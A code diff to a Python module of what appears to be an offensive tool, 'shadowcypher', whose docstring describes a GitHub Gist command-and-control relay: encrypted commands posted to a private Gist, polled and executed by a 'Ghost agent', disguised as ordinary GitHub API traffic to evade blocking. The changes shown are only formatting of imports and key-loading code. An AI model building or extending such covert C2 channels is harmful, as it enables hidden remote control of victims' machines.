@@ -5,7 +5,12 @@ Commands are written to a private Gist as AES-GCM encrypted blobs.
 The Ghost agent polls the Gist, decrypts, and executes.
 Traffic looks like normal GitHub API calls — extremely hard to block.
 """
-import os, json, time, base64, secrets, threading
+import os
+import json
+import time
+import base64
+import secrets
+import threading
 from typing import Optional, Callable
 from shadowcypher.core.logger import logger
 
@@ -217,8 +222,10 @@ class GitHubRelay:
     def _load_key(self) -> Optional[bytes]:
         env_key = os.environ.get("SHADOWCYPHER_C2_KEY", "")
         if env_key:
-            try: return bytes.fromhex(env_key)
-            except Exception: pass
+            try:
+                return bytes.fromhex(env_key)
+            except Exception:
+                pass
         key_path = os.path.expanduser("~/.shadowcypher/c2_relay.key")
         if os.path.exists(key_path):
             with open(key_path, "rb") as f:
@@ -239,8 +246,10 @@ class GitHubRelay:
     @staticmethod
     def _emit(cb, msg):
         if cb:
-            try: cb(msg)
-            except Exception: pass
+            try:
+                cb(msg)
+            except Exception:
+                pass
 
 
 github_relay = GitHubRelay()
